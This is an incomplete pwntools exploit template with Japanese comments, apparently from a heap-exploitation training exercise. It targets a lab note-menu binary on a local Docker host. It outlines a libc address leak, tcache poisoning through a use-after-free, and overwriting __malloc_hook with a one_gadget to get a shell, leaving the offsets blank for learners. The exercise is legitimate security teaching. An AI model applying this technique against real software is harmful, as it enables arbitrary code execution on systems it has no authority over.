#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *
context.arch = 'amd64'

############## Utils #################
def menu():
  _  = s.recvuntil('1: create note')
  _ += s.recvuntil('2: delete note')
  _ += s.recvuntil('3: edit note')
  _ += s.recvuntil('4: exit')
  _ += s.recvuntil('Command >> ')
  #print(_)
  return;

def create_note(size, data):
  s.sendline('1')                    # Command >> 1 ; 1. create noteをメニュー選択
  s.recvuntil('[*] Note data size:') # プロンプト読み取り
  s.sendline(str(size))              # Note data sizeを指定
  s.recvuntil('[*] Note data: ')     # プロンプト読み取り
  s.sendline(data)                   # 実際にデータを送る. 
  # 格納したノートのインデックスを読み取り, 整数データとして返す. 
  idx = s.recvline().strip().decode().split(':')[-1] 
  idx = int(idx)
  menu()
  return idx

def delete_note(idx):
  s.sendline('2')                    # Command >> 2; 2. delete noteをメニュー選択
  s.recvuntil('index: ')
  s.sendline(str(idx))               # 削除したいノートのインデックスを引数に指定 
  menu()
  return 


def edit_note(idx, data):
  s.sendline('3')
  s.recvuntil('index: ')
  s.sendline(str(idx))
  s.recvuntil('data: ')
  s.sendline(data)
  menu()
  return 



### nmコマンドから各種オフセットを求めておく. 
"""
nm -D /tmp/libc-2.27.so | grep -E -e 'V (__malloc_hook|__free_hook)' -e ' puts$' -e ' system'
one_gadget /tmp/libc-2.27.so
"""
ofs_malloc_hook = 
ofs_free_hook   = 
ofs_puts        = 
ofs_onegadget   = 

HOST, PORT = '172.17.0.2', 1337 
s = remote(HOST, PORT)
#s = process('./handson3')
addr_puts  = int(s.readline().strip().decode().split(':')[-1] , 16)
print(f"address of `puts`: {addr_puts :#08x}")
menu()

## アドレス解決
libc_base   = 
malloc_hook = 
one_gadget  = 


A = create_note(0x10, b'A' * 0x0f)
## chunk Aに対してnextにUAFで書き込む. (edit_note関数を実装していますのでそちらを使ってください)
## 整数をメモリに書き込む場合はp64関数を使う. 


## 2回mallocして, 書き込んだnextのアドレスを返させる. 
B = create_note(0x10, b'JUNK')
C = create_note(0x10, p64(one_gadget))

input('gdb?') # 確認用. 

# choise create_note
s.sendline('1');
s.recvuntil(':') # data size
s.sendline('1')  #このサイズは適当. 

## 書き換えた__malloc_hookでmallocを呼び出すとそれはone_gaget or systemに変わっている. 
s.interactive()
